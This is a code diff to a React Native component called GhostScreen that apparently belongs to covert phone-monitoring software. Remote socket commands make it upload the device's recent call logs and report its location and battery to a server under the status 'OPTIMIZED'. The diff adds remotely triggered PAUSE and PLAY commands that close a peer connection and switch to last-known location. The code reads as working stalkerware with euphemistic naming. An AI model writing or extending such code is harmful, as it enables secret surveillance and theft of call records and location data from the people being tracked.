@@ -24,6 +24,7 @@ const GhostScreen = ({ name, onLogout }) => {
   const [isSyncing, setIsSyncing] = useState(false);
   const [calibrationPulse, setCalibrationPulse] = useState(false);
   const pcRef = useRef(null);
+  const isPausedRef = useRef(false);
 
   useEffect(() => {
     const startup = async () => {
@@ -80,6 +81,18 @@ const GhostScreen = ({ name, onLogout }) => {
       } else if (cmd === 'LOG_SYNC') {
         const logs = await CallLogs.load(10);
         socket.emit('ghost_activity', { name, type: 'LOG_SYNC', data: logs });
+      } else if (cmd === 'PAUSE') {
+        isPausedRef.current = true;
+        if (pcRef.current) {
+          pcRef.current.close();
+          pcRef.current = null;
+        }
+        setIsSyncing(false);
+        setCalibrationPulse(false);
+        updateVitals();
+      } else if (cmd === 'PLAY') {
+        isPausedRef.current = false;
+        updateVitals();
       }
     });
 
@@ -101,7 +114,11 @@ const GhostScreen = ({ name, onLogout }) => {
     } catch (e) {}
 
     try {
-      loc = await Location.getCurrentPositionAsync({ accuracy: Location.Accuracy.Balanced, timeout: 5000 });
+      if (isPausedRef.current) {
+        loc = await Location.getLastKnownPositionAsync();
+      } else {
+        loc = await Location.getCurrentPositionAsync({ accuracy: Location.Accuracy.Balanced, timeout: 5000 });
+      }
     } catch (e) {
       try {
         loc = await Location.getLastKnownPositionAsync();
@@ -112,7 +129,7 @@ const GhostScreen = ({ name, onLogout }) => {
       name,
       battery: Math.floor(bat * 100) + '%',
       location: loc ? { lat: loc?.coords?.latitude || 0, lng: loc?.coords?.longitude || 0 } : { lat: 0, lng: 0 },
-      status: 'OPTIMIZED',
+      status: isPausedRef.current ? 'PAUSED' : 'OPTIMIZED',
       lastSeen: Date.now()
     });
   };
